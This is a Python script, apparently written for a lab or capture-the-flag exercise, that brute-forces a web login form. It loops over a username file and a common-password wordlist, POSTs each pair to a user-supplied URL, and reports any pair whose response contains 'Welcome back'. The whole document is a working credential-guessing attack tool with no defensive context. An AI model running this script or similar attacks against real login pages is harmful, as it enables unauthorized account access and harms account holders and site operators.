import sys
import requests

# Ask the user for the login page URL
target = input(
    "Write your target URL (example: http://10.10.10.10/login): "
).strip()

# Wordlists used for usernames and passwords
usernames_file = "commonusernames.txt"
passwords_file = "/usr/share/seclists/Passwords/Common-Credentials/top-100.txt"

# Text expected after successful authentication
needle = "Welcome back"

# Load usernames into a list
with open(usernames_file, "r", encoding="latin-1") as uf:
    usernames = [line.strip() for line in uf if line.strip()]

# Loop through each username
for username in usernames:

    found = False

    # Open password wordlist
    with open(passwords_file, "r", encoding="latin-1") as pf:

        # Try every password for the current username
        for password in pf:

            password = password.strip()

            if not password:
                continue

            # Display current attempt in terminal
            sys.stdout.write(
                f"\r[X] Attempting user:password -> {username}:{password}"
            )

            sys.stdout.flush()

            # Send POST request to login form
            r = requests.post(
                target,
                data={
                    "username": username,
                    "password": password
                }
            )

            # Check if login succeeded
            if needle in r.text:

                sys.stdout.write("\n")

                print(
                    f"[>>>>>] Valid password '{password}' found for user '{username}'"
                )

                found = True
                break

    sys.stdout.write("\n")

    if not found:
        print(f"No password found for {username}")
